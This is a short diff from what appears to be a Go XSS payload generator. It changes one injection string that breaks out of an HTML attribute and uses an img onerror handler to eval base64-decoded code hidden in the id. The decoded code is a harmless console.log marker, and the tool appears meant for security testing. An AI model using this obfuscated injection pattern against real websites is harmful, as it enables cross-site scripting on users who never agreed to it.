@@ -35,7 +35,7 @@ func GetAllPayloads(callbackServer string) []XSSPayload {
 	// === PAYLOAD ESPECÍFICO - CONSOLE LOG ===
 	// Payload con img tag, id en base64 y onerror que ejecuta el base64
 	// Base64 de: console.log('11223344')
-	specificPayload := `"><img src=x id=Y29uc29sZS5sb2coJzExMjIzMzQ0Jyk= onerror=eval(atob(this.id))>`
+	specificPayload := `"><img src=x id=Y29uc29sZS5sb2coIjExMjIzMzQ0Iik= onerror=eval(atob(this.id))>`
 
 	id1 := GeneratePayloadID()
 	payloads = append(payloads, XSSPayload{
